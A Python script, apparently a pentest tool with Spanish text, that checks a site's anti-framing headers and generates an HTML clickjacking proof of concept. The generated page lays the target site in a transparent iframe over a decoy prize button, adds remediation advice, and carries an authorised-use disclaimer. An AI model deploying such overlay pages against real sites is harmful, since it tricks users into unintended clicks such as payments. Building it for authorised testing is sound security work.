#!/usr/bin/env python3

import argparse
import os
import re
import sys
import urllib.request
import urllib.error
import ssl
from datetime import datetime


BANNER = r"""
  ██████╗██╗     ██╗ ██████╗██╗  ██╗     ██╗ █████╗  ██████╗██╗  ██╗
 ██╔════╝██║     ██║██╔════╝██║ ██╔╝     ██║██╔══██╗██╔════╝██║ ██╔╝
 ██║     ██║     ██║██║     █████╔╝      ██║███████║██║     █████╔╝ 
 ██║     ██║     ██║██║     ██╔═██╗ ██   ██║██╔══██║██║     ██╔═██╗ 
 ╚██████╗███████╗██║╚██████╗██║  ██╗╚█████╔╝██║  ██║╚██████╗██║  ██╗
  ╚═════╝╚══════╝╚═╝ ╚═════╝╚═╝  ╚═╝ ╚════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
         Clickjacking PoC Generator | Solo para uso autorizado
"""

def check_headers(url: str) -> dict:

    results = {
        "x_frame_options": None,
        "csp_frame_ancestors": None,
        "vulnerable": False,
        "status_code": None,
        "error": None,
        "all_headers": {},
    }

    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        req = urllib.request.Request(
            url, headers={"User-Agent": "Mozilla/5.0 (PoC-Clickjacking-Tester)"}
        )
        with urllib.request.urlopen(req, timeout=10, context=ctx) as response:
            results["status_code"] = response.status
            headers = {k.lower(): v for k, v in response.headers.items()}
            results["all_headers"] = dict(headers)

            xfo = headers.get("x-frame-options", None)
            csp = headers.get("content-security-policy", None)

            results["x_frame_options"] = xfo

            if csp:
                for directive in csp.split(";"):
                    directive = directive.strip()
                    if directive.lower().startswith("frame-ancestors"):
                        results["csp_frame_ancestors"] = directive
                        break

            has_xfo = xfo and xfo.upper() in ("DENY", "SAMEORIGIN")
            has_csp_protection = results["csp_frame_ancestors"] is not None
            results["vulnerable"] = not has_xfo and not has_csp_protection

    except urllib.error.HTTPError as e:
        results["status_code"] = e.code
        results["error"] = f"HTTP Error {e.code}"
    except urllib.error.URLError as e:
        results["error"] = f"URL Error: {e.reason}"
    except Exception as e:
        results["error"] = str(e)

    return results

def print_header_results(url: str, results: dict):
    W = "\033[0m"
    R = "\033[91m"
    G = "\033[92m"
    Y = "\033[93m"
    B = "\033[94m"
    BOLD = "\033[1m"

    print(f"\n{'═'*62}")
    print(f"  {BOLD}ANÁLISIS DE ENCABEZADOS DE SEGURIDAD{W}")
    print(f"  URL: {B}{url}{W}")
    print(f"{'═'*62}")

    if results["error"]:
        print(f"  {R}[!] Error al conectar: {results['error']}{W}")
        print(f"{'═'*62}\n")
        return

    print(f"  HTTP Status            : {results['status_code']}")

    xfo = results["x_frame_options"]
    csp = results["csp_frame_ancestors"]

    if xfo:
        print(f"  X-Frame-Options        : {G}[PRESENTE]{W}  {xfo}")
    else:
        print(f"  X-Frame-Options        : {R}[NO ENCONTRADO]{W}  ← encabezado ausente")

    if csp:
        print(f"  CSP frame-ancestors    : {G}[PRESENTE]{W}  {csp}")
    else:
        print(f"  CSP frame-ancestors    : {R}[NO ENCONTRADO]{W}  ← encabezado ausente")

    print()
    if results["vulnerable"]:
        print(f"  {R}{BOLD}[!!!] VULNERABLE A CLICKJACKING{W}")
        print(f"  {R}      Ningún encabezado de protección fue detectado.{W}")
        print(f"  {Y}      El sitio puede ser embebido en un iframe por un atacante.{W}")
    else:
        print(f"  {G}{BOLD}[OK]  PROTEGIDO — Encabezados de seguridad detectados.{W}")
        print(f"  {G}      El sitio tiene restricciones de framing configuradas.{W}")
        print(f"  {Y}      Nota: verifica la configuración exacta manualmente.{W}")

    print(f"{'═'*62}\n")


def _badge(present: bool, value: str = "") -> str:
    if present:
        return (
            f'<span class="badge badge-ok">✔ PRESENTE</span>'
            f'<code class="hval">{value}</code>'
        )
    return (
        '<span class="badge badge-miss">✘ NO ENCONTRADO</span>'
        '<code class="hval hmiss">Encabezado no configurado en el servidor</code>'
    )


def generate_poc_html(
    target_url: str,
    output_path: str,
    header_results: dict = None,
    opacity: float = 0.0,
    custom_text: str = None,
) -> str:
    button_text = custom_text or "Haz clic aquí para reclamar tu premio"
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if header_results is None:
        header_results = {
            "x_frame_options": None, "csp_frame_ancestors": None,
            "vulnerable": True, "status_code": "N/A", "error": None,
        }

    xfo_val    = header_results.get("x_frame_options")
    csp_val    = header_results.get("csp_frame_ancestors")
    vulnerable = header_results.get("vulnerable", True)
    http_code  = header_results.get("status_code", "N/A")

    xfo_cell = _badge(bool(xfo_val), xfo_val or "")
    csp_cell = _badge(bool(csp_val), csp_val or "")

    if vulnerable:
        vuln_html = """
        <div class="vuln-banner vuln-yes">
            <span class="vuln-icon">⚠</span>
            <div>
                <strong>VULNERABLE A CLICKJACKING</strong>
                <p>No se encontraron encabezados de protección contra framing.
                Un atacante puede incrustar este sitio dentro de un iframe invisible
                y engañar a usuarios para que hagan clics no intencionales.</p>
            </div>
        </div>"""
    else:
        vuln_html = """
        <div class="vuln-banner vuln-no">
            <span class="vuln-icon">🛡</span>
            <div>
                <strong>PROTEGIDO CONTRA CLICKJACKING</strong>
                <p>Se detectaron encabezados de seguridad que restringen el framing.
                El sitio tiene controles configurados que pueden prevenir este ataque.
                Verifica la configuración exacta manualmente para confirmar.</p>
            </div>
        </div>"""

    fix_items = []
    if not xfo_val:
        fix_items.append("""
            <div class="fix-item">
                <span class="fix-header">X-Frame-Options</span>
                <code>X-Frame-Options: DENY</code>
                <span class="fix-note">Impide que el sitio sea cargado en cualquier iframe, incluyendo el mismo dominio.</span>
            </div>""")
    if not csp_val:
        fix_items.append("""
            <div class="fix-item">
                <span class="fix-header">Content-Security-Policy: frame-ancestors</span>
                <code>Content-Security-Policy: frame-ancestors 'none'</code>
                <span class="fix-note">Método moderno y más flexible. Reemplaza X-Frame-Options en navegadores modernos.</span>
            </div>""")
    if not fix_items:
        remediation_html = '<p style="color:#3fb950;font-size:13px;margin:0">✔ No se requieren correcciones — los encabezados están presentes.</p>'
    else:
        remediation_html = "".join(fix_items)

    opacity_int = int(opacity * 100)

    html = f"""<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clickjacking PoC — {target_url}</title>
    <style>
        *{{margin:0;padding:0;box-sizing:border-box}}
        body{{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#0d1117;color:#e6edf3;min-height:100vh}}

        .poc-header{{background:#161b22;border-bottom:1px solid #30363d;padding:12px 24px;display:flex;align-items:center;gap:12px;position:fixed;top:0;left:0;right:0;z-index:9999}}
        .poc-badge{{background:#da3633;color:#fff;font-size:11px;font-weight:700;padding:3px 8px;border-radius:4px;letter-spacing:1px}}
        .poc-header span{{font-size:13px;color:#8b949e}}
        .poc-header strong{{color:#58a6ff}}

        .container{{padding:72px 24px 32px;max-width:1100px;margin:0 auto}}
        .section-title{{font-size:11px;text-transform:uppercase;letter-spacing:1.5px;color:#8b949e;margin:22px 0 8px}}

        .info-row{{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:6px}}
        .info-chip{{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:10px 16px;font-size:13px}}
        .info-chip label{{font-size:10px;text-transform:uppercase;letter-spacing:1px;color:#8b949e;display:block;margin-bottom:2px}}
        .info-chip span{{font-family:monospace;color:#e6edf3}}

        .vuln-banner{{border-radius:8px;padding:16px 20px;display:flex;align-items:flex-start;gap:16px;margin-bottom:6px}}
        .vuln-yes{{background:#2d1212;border:1px solid #da3633}}
        .vuln-no{{background:#0d2016;border:1px solid #3fb950}}
        .vuln-icon{{font-size:30px;line-height:1;padding-top:2px}}
        .vuln-banner strong{{font-size:15px;display:block;margin-bottom:5px}}
        .vuln-yes strong{{color:#f85149}}
        .vuln-no  strong{{color:#3fb950}}
        .vuln-banner p{{font-size:13px;color:#8b949e;line-height:1.6}}

        .headers-grid{{background:#161b22;border:1px solid #30363d;border-radius:8px;overflow:hidden;margin-bottom:6px}}
        .hrow{{display:grid;grid-template-columns:220px 1fr;align-items:center;gap:0;border-bottom:1px solid #21262d;padding:13px 18px}}
        .hrow:last-child{{border-bottom:none}}
        .hrow-head{{background:#1c2128;font-size:11px;text-transform:uppercase;letter-spacing:1px;color:#8b949e;font-weight:600}}
        .hname{{font-family:monospace;font-size:13px;color:#e6edf3}}
        .hcell{{display:flex;align-items:center;gap:10px;flex-wrap:wrap}}
        .badge{{display:inline-block;font-size:11px;font-weight:700;padding:3px 10px;border-radius:20px;letter-spacing:.5px;white-space:nowrap}}
        .badge-ok  {{background:#0d2016;color:#3fb950;border:1px solid #3fb950}}
        .badge-miss{{background:#2d1212;color:#f85149;border:1px solid #da3633}}
        .hval{{font-family:monospace;font-size:12px;color:#8b949e;word-break:break-all}}
        .hmiss{{color:#6e4040;font-style:italic}}

        .remediation{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px 20px;margin-bottom:6px}}
        .fix-item{{margin-bottom:14px;padding-bottom:14px;border-bottom:1px solid #21262d}}
        .fix-item:last-child{{margin-bottom:0;padding-bottom:0;border-bottom:none}}
        .fix-header{{font-size:11px;text-transform:uppercase;letter-spacing:1px;color:#8b949e;display:block;margin-bottom:5px}}
        .fix-item code{{display:inline-block;background:#0d1117;border:1px solid #30363d;border-radius:4px;padding:5px 10px;font-size:13px;color:#79c0ff;margin-bottom:5px}}
        .fix-note{{font-size:12px;color:#8b949e;display:block}}

        .controls{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:14px 18px;margin-bottom:6px;display:flex;align-items:center;gap:14px;flex-wrap:wrap}}
        .controls label{{font-size:13px;color:#8b949e;min-width:220px}}
        .controls input[type=range]{{flex:1;accent-color:#58a6ff;min-width:180px}}
        .opacity-val{{font-family:monospace;font-size:14px;color:#58a6ff;min-width:38px}}
        .btn-sm{{background:#21262d;border:1px solid #30363d;color:#e6edf3;padding:6px 14px;border-radius:6px;cursor:pointer;font-size:13px}}
        .btn-sm:hover{{background:#30363d}}

        .demo-area{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:20px;margin-bottom:6px}}
        .demo-area h2{{font-size:13px;color:#f0883e;margin-bottom:4px;text-transform:uppercase;letter-spacing:1px}}
        .demo-area>.desc{{font-size:12px;color:#8b949e;margin-bottom:14px;line-height:1.6}}

        .clickjack-wrapper{{position:relative;width:100%;height:580px;border-radius:6px;overflow:hidden;border:1px solid #21262d}}
        .victim-iframe{{position:absolute;top:0;left:0;width:100%;height:100%;opacity:{opacity:.2f};border:none;z-index:2}}
        .decoy-layer{{position:absolute;top:0;left:0;width:100%;height:100%;background:linear-gradient(135deg,#1a1a2e,#16213e,#0f3460);z-index:1;display:flex;align-items:center;justify-content:center}}
        .decoy-prize-box{{background:linear-gradient(135deg,#f6d365,#fda085);border-radius:16px;padding:40px 60px;text-align:center;box-shadow:0 20px 60px rgba(253,160,133,.3);animation:pulse 2s ease-in-out infinite}}
        @keyframes pulse{{0%,100%{{transform:scale(1);box-shadow:0 20px 60px rgba(253,160,133,.3)}}50%{{transform:scale(1.02);box-shadow:0 25px 80px rgba(253,160,133,.5)}}}}
        .decoy-prize-box h1{{font-size:28px;color:#1a1a2e;margin-bottom:8px}}
        .decoy-prize-box p{{color:#4a3728;font-size:14px;margin-bottom:20px}}
        .decoy-btn{{background:#1a1a2e;color:#fda085;border:none;padding:14px 36px;font-size:16px;font-weight:700;border-radius:8px;cursor:pointer}}

        .disclaimer{{background:#1c2128;border:1px solid #da3633;border-radius:8px;padding:14px 18px;font-size:12px;color:#8b949e;line-height:1.6;margin-top:16px}}
        .disclaimer strong{{color:#da3633}}
    </style>
</head>
<body>

<div class="poc-header">
    <span class="poc-badge">⚠ PoC</span>
    <span>Clickjacking Demo &mdash; Target: <strong>{target_url}</strong></span>
    <span style="margin-left:auto;font-size:11px">Generado: {timestamp}</span>
</div>

<div class="container">

    <p class="section-title">Información general</p>
    <div class="info-row">
        <div class="info-chip"><label>URL Objetivo</label><span>{target_url}</span></div>
        <div class="info-chip"><label>HTTP Status</label><span>{http_code}</span></div>
        <div class="info-chip"><label>Técnica</label><span>UI Redressing / Iframe Overlay</span></div>
    </div>

    <p class="section-title">Veredicto de vulnerabilidad</p>
    {vuln_html}

    <p class="section-title">Análisis de encabezados de seguridad</p>
    <div class="headers-grid">
        <div class="hrow hrow-head">
            <span>Encabezado HTTP</span>
            <span>Estado / Valor detectado</span>
        </div>
        <div class="hrow">
            <span class="hname">X-Frame-Options</span>
            <div class="hcell">{xfo_cell}</div>
        </div>
        <div class="hrow">
            <span class="hname">CSP: frame-ancestors</span>
            <div class="hcell">{csp_cell}</div>
        </div>
    </div>

    <p class="section-title">Recomendaciones de remediación</p>
    <div class="remediation">
        {remediation_html}
    </div>

    <p class="section-title">Demo interactiva</p>
    <div class="controls">
        <label> Opacidad del iframe víctima (0 = invisible, 100 = visible):</label>
        <input type="range" id="opacity-slider" min="0" max="100"
               value="{opacity_int}" oninput="updateOpacity(this.value)">
        <span class="opacity-val" id="opacity-display">{opacity_int}%</span>
        <button class="btn-sm" onclick="toggleIframe()">Mostrar / Ocultar iframe</button>
    </div>

    <div class="demo-area">
        <h2> Demostración en vivo</h2>
        <p class="desc">El iframe del sitio víctima (transparente) está superpuesto sobre el botón señuelo.
        Usa el slider para revelar la superposición y comprender el ataque.</p>

        <div class="clickjack-wrapper">
            <div class="decoy-layer">
                <div class="decoy-prize-box">
                    <h1>🎉 ¡Felicidades!</h1>
                    <p>Has sido seleccionado como ganador del día.</p>
                    <button class="decoy-btn">{button_text}</button>
                </div>
            </div>
            <iframe class="victim-iframe" id="victim-frame"
                    src="{target_url}"
                    sandbox="allow-scripts allow-forms allow-same-origin"
                    title="Victim site (PoC only)"></iframe>
        </div>
    </div>

    <div class="disclaimer">
        <strong>⚠ AVISO LEGAL:</strong> Esta herramienta es exclusivamente para uso en
        entornos <strong>autorizados</strong>: pruebas de penetración con contrato, programas de bug bounty,
        y laboratorios propios. El uso no autorizado contra sistemas de terceros puede constituir
        un delito informático. El autor no se responsabiliza del uso indebido.
    </div>

</div>

<script>
    function updateOpacity(val) {{
        document.getElementById('victim-frame').style.opacity = val / 100;
        document.getElementById('opacity-display').textContent = val + '%';
    }}
    function toggleIframe() {{
        const f = document.getElementById('victim-frame');
        f.style.display = f.style.display === 'none' ? 'block' : 'none';
    }}
</script>
</body>
</html>
"""

    with open(output_path, "w", encoding="utf-8") as f:
        f.write(html)

    return output_path

def main():
    parser = argparse.ArgumentParser(
        description="Clickjacking PoC Generator — Uso exclusivo en entornos autorizados",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos de uso:
  python3 clickjacking_poc.py -u http://localhost:8080
  python3 clickjacking_poc.py -u https://example.com --check-only
  python3 clickjacking_poc.py -u http://192.168.1.10 -o reporte.html --opacity 0.5
  python3 clickjacking_poc.py -u http://app.local --decoy-text "Confirmar pago"
        """
    )
    parser.add_argument("-u", "--url",        required=True,  help="URL objetivo (ej: http://localhost:8080)")
    parser.add_argument("-o", "--output",     default="clickjacking_poc.html", help="Archivo HTML de salida")
    parser.add_argument("--check-only",       action="store_true", help="Solo verifica headers, sin generar PoC")
    parser.add_argument("--opacity",          type=float, default=0.0, help="Opacidad inicial del iframe (0.0-1.0)")
    parser.add_argument("--decoy-text",       type=str,   default=None, help="Texto del botón señuelo")
    parser.add_argument("--no-check",         action="store_true", help="Salta la verificación de headers")
    args = parser.parse_args()

    print(BANNER)

    if not 0.0 <= args.opacity <= 1.0:
        print("[!] La opacidad debe estar entre 0.0 y 1.0")
        sys.exit(1)

    url = args.url
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
        print(f"[*] URL normalizada: {url}")

    header_results = None
    if not args.no_check:
        print(f"[*] Verificando encabezados de seguridad en: {url}")
        header_results = check_headers(url)
        print_header_results(url, header_results)
        if args.check_only:
            sys.exit(0)
    else:
        print("[*] Saltando verificación de headers (--no-check activado)")

    print("[*] Generando PoC HTML con panel de análisis...")
    poc_path = generate_poc_html(
        target_url=url,
        output_path=args.output,
        header_results=header_results,
        opacity=args.opacity,
        custom_text=args.decoy_text,
    )

    abs_path = os.path.abspath(poc_path)
    print(f"[+] PoC generado exitosamente:")
    print(f"    Ruta  : {abs_path}")
    print(f"    Abre el archivo en un navegador para ver la demostración.\n")
    print("[!] Recuerda: usa esto únicamente en entornos autorizados.\n")


if __name__ == "__main__":
    main()
